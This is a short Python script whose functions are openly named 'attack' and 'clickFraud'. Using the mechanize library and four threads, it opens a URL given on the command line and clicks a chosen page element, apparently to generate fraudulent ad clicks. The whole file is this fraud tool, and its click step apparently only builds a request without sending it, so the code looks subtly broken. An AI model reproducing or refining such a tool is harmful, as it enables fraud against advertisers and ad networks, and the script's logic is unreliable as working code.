import sys, os, threading, mechanize
from mechanize import Browser

def attack(address, htmlObject):
    br = Browser()
    br.open(address)
    
    br.click(htmlObject)


def clickFraud(address, htmlObject):
    threads = []
    for i in range(4):
        t = threading.Thread(target=attack, args = (address, htmlObject,))
        threads.append(t)
        t.start()

def main():
    if len(sys.argv) != 3:
        sys.exit(1)
    address = sys.argv[1]
    htmlObject = (sys.argv[2])
    clickFraud(address,htmlObject)

if __name__ == '__main__':
    main();